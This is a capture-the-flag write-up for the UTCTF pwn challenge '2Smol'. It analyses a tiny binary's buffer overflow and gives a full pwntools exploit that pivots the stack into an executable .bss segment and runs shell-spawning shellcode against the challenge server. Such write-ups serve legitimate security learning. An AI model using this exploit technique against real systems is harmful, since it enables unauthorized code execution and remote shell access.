# 2Smol

**Category**: Pwn \
**Points**: 910 (96 solves) \
**Author**: hukc

## Challenge

I made this binary 2smol.

`nc pwn.utctf.live 9998`

Attachments: `smol`

## Overview

This is the entire `objdump` output:
```asm
_start:
  call   40100d <main>
  mov    eax,0x3c
  syscall
  ret

main:
  push   rbp
  mov    rbp,rsp
  sub    rsp,0x8
  lea    rdi,[rbp-0x8]
  call   401023 <_read>
  mov    rsp,rbp
  pop    rbp
  ret

_read:
  push   rbp
  mov    rbp,rsp
  sub    rsp,0x8
  mov    rsi,rdi
  mov    edi,0x0
  mov    edx,0x200
  mov    eax,0x0
  syscall
  mov    rsp,rbp
  pop    rbp
  ret
```

In C, it looks like
```c
void main() {
    _read($rbp - 8);
}

void _read(char* buf) {
    read(0, buf, 0x200);
}
```

This definitely is a smol challenge. Let's do `checksec`:
```
$ checksec smol
[*] '/home/plushie/Programs/bbb_writeups/2021/utctf/2Smol/smol'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

## Solution

The program attempts to read 512 bytes into a buffer of size 8. Clearly we have
a buffer overflow lol.

Since NX is disabled, we can probably inject shellcode. But where do we put it?
Let's check the virtual memory map in GDB:

```gdb
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
          0x400000           0x402000 r-xp     2000 0      /home/plushie/Programs/bbb_writeups/2021/utctf/2Smol/smol
          0x402000           0x403000 rwxp     1000 0
    0x7fffe97bf000     0x7fffe97e1000 rwxp    22000 0      [stack]
    0x7fffe97ec000     0x7fffe97ef000 r--p     3000 0      [vvar]
    0x7fffe97ef000     0x7fffe97f0000 r-xp     1000 0      [vdso]
0xffffffffff600000 0xffffffffff601000 --xp     1000 0      [vsyscall]
```

Notice that `0x402000 - 0x403000` is `RWX`. This is actually the `.bss` segment:
```gdb
pwndbg> info file
Symbols from "/home/plushie/Programs/bbb_writeups/2021/utctf/2Smol/smol".
Native process:
	Using the running image of attached process 147807.
	While running this, GDB does not access memory from...
Local exec file:
	`/home/plushie/Programs/bbb_writeups/2021/utctf/2Smol/smol', file type elf64-x86-64.
	Entry point: 0x401000
	0x0000000000401000 - 0x0000000000401044 is .text
	0x0000000000402000 - 0x0000000000403000 is .bss
	0x00007fffe97ef120 - 0x00007fffe97ef164 is .hash in system-supplied DSO at 0x7fffe97ef000
	0x00007fffe97ef168 - 0x00007fffe97ef1b8 is .gnu.hash in system-supplied DSO at 0x7fffe97ef000
	...
```

I recently did a [challenge](https://github.com/qxxxb/ctf/tree/master/2021/zer0pts_ctf/not_beginners_stack)
from [zer0pts CTF](https://2021.ctf.zer0pts.com/index.html#/) where I had to
migrate the stack to the `.bss` section, and it looks like the same trick will
work here since we can overwrite `$rbp`.

Here's my script:
```python
import pwn

pwn.context.binary = elf = pwn.ELF("./smol")

if pwn.args.LOCAL:
    io = pwn.process("./smol")
else:
    io = pwn.remote("pwn.utctf.live", 9998)

if pwn.args.GDB:
    pwn.gdb.attach(
        io,
        gdbscript="""
break *(&_read+32)
continue
    """,
    )

bss = 0x402020  # Add 0x20 so the stack has room to grow without segfaulting
read_again = 0x401015  # Address of `_read`

payload = b"A" * 8
# Overwrite $rbp to migrate stack to .bss, which is RWX
payload += pwn.p64(bss + 0x10)
# Set return address to `_read` to write our shellcode onto our new stack.
payload += pwn.p64(read_again)

io.sendline(payload)

payload = b"B" * 16
# Overwrite return address to jump to our shellcode
payload += pwn.p64(bss + 0x20)
# Add our shellcode
payload += pwn.asm(pwn.shellcraft.sh())

io.sendline(payload)
io.interactive()
```

Output:
```
$ python3 solve.py
[*] '/home/plushie/Programs/bbb_writeups/2021/utctf/2Smol/smol'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
[+] Opening connection to pwn.utctf.live on port 9998: Done
[*] Switching to interactive mode
$ cat flag.txt
utflag{srop_xd}
```

Yay we got the flag, though it hints that we were supposed to do SROP which
should work too I guess :O
